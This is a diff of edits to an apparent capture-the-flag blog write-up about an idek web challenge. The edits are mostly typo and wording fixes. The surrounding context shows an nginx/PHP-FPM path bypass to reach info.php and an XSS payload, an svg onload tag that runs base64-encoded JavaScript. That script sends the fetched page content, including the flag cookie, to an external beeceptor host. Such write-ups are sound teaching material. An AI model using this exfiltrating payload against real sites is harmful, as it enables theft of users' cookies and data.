@@ -73,7 +73,7 @@ Result:
 
 ![admin-visiting](/blog/images/2024-08-18-22-33-18.png)
 
-Since the 'admin' will visit our page, maybe the page that the admin was in contains
+Since the 'admin' will visit our page, maybe the page that the admin was at contains
 information that we want, a FLAG cookie for example, but in order to verify my claim,
 we have to check the source code of the application. Luckily for us, the source code is
 available, and has the following structure:
@@ -114,7 +114,7 @@ which maps to the challenge webpage.
 
 > "PHP-FPM is an alternative PHP FastCGI implementation that was introduced to overcome the limitations of the traditional PHP-CGI (Common Gateway Interface). It works as a process manager, managing PHP processes and handling PHP requests separately from the web server"
 
-> "Nginx is a web server that can also be used as a reverse proxy, load balancer, mail proxy and"
+> "Nginx is a web server that can also be used as a reverse proxy, load balancer, mail proxy...etc"
 
 In a nutshell, nginx receives our request (from the browser..etc), processes the URL
 according to its configuration, if the path matches a php file, it passes the request
@@ -145,7 +145,7 @@ if(isset($_GET['name'])) {
 ?>
 ```
 
-**Explanation**: This PHP script greets the user based on the `name` parameter in the query string. It removes certain characters from the `name` using the `Enhanced_Trim` function and limits the length of `name` to 23 characters before displaying it.
+**Explanation**: This PHP script greets the user based on the `name` parameter in the query string. It removes certain characters from the `name` using the `Enhanced_Trim` function and limits the length of `$name` to 23 characters.
 
 ### `info.php`
 
@@ -283,7 +283,7 @@ location = /info.php {
 
 Nginx denies access to an exact location `/info.php`. If we navigate to something
 like `/info.php/whatever.php`, PHP-FPM processes the first php file and ignores subsequent files.
-This is called an HTTP Desync attacks, which arises from the subtle discrepancies in
+This is called an HTTP Desync attack, which arises from the subtle discrepancies in
 which two technologies handle HTTP requests. Let's try it out:
 
 
@@ -297,8 +297,8 @@ the attacker.
 
 ## Exploit - continued
 
-Before we craft the XSS payload, let's first code injected JS, which looks something
-like this:
+Before we craft the XSS payload, let's first write the JS code which will be injected.
+It should look like this:
 
 
 ```js
@@ -318,7 +318,7 @@ fetch('http://idek-hello.chal.idek.team:1337/info.php/whatever.php')
 The script is simple enough, we first fetch the info page, with its response captured,
 we send it to our hosted server (I used beeceptor to tunnel my localhost) and retrieve the flag.
 
-The server in case you are wondering looks like this (written in flask)
+The server in case you are wondering looks something like this (written in flask):
 
 ```python
 from flask import Flask, request, jsonify
@@ -366,7 +366,7 @@ Cool, let's modify the payload to look like this:
 <svg%0Conload="eval(atob('<our-base-64-javascript-code>'))">
 ```
 
-Lastly, to deliver the exploit, we just have to send the payload as a query paramter for `name`,
+Lastly, to deliver the exploit, we just have to send the payload as a query parameter for `name`,
 just like this:
 
 ```html
@@ -376,6 +376,8 @@ M2EzNjhkYzY1ZDc2YTExM2Y3NGZiLmZyZWUuYmVlY2VwdG9yLmNvbS9zYXZlJywge21ldGhvZDon
 UE9TVCcsaGVhZGVyczp7J0NvbnRlbnQtVHlwZSc6J2FwcGxpY2F0aW9uL2pzb24nfSxib2R5OkpT
 T04uc3RyaW5naWZ5KHtjb250ZW50OmR9KX0pKQ=='))">
 ```
+
+Click on submit...
 
 ![flag-cookie](/blog/images/2024-08-18-23-44-03.png)
 
